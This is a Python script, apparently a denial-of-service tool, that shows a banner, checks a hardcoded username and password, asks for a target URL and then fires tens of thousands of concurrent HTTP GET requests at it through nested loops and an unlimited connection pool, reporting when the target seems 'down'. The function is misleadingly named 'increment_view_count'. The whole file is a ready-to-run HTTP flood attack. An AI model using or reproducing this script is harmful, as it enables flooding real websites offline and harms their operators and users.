#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import asyncio
import aiohttp
import fade

# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")

attemps = 0
logo = """
╔══════════════════════════════════════════════════════╗
║\033[33m                ~ H U D A I R U L  A L - A Q S H A ~          \033[31m║
║\033[32m                    I N T E R N A L  S C R I P T              \033[31m║
║\033[96m                           By: Aby'Walidein                   \033[31m║
║\033[37m                               ——o0o——                        \033[31m║
╚══════════════════════════════════════════════════════╝033[0m
"""
faded_text = fade.fire(logo)
print(faded_text)
while attemps < 100:
    username = input("\033[38;5;2mUsername: \033[0m")
    password = input("\033[38;5;2mPassword: \033[0m")

    if username == 'cebong' and password == 'go*block':
        print("\033[48;5;7m═⟩⟩ \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ask = fade.pinkred("\033[48;5;4m═⟩⟩ Enter URL (http://example.com:\033[0m \033[32m\033[0m")
url = input(ask)

ask = fade.pinkred('txt')
print("\033[32mLoading......")

async def increment_view_count(session):
    try: 
        async with session.get(url) as response:
            if response.status == 200:
                time.sleep(0.01)
                print("\033[48;5;2mInfo target \033[0m \033[33m" +str(url)+ " \033[35work\033[0m")
            else:
                time.sleep(0.01)
                print("\033[38;5;2mInfo target \033[33m" +str(url)+ " \033[35work\033[0m")          
    except aiohttp.ClientError as e:
            time.sleep(0.01)
            print("\033[48;5;1mInfo target \033[0m \033[38;5;3m" +str(url)+ "  \033[38;5;7mMaybe down!\033[0m")

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())      
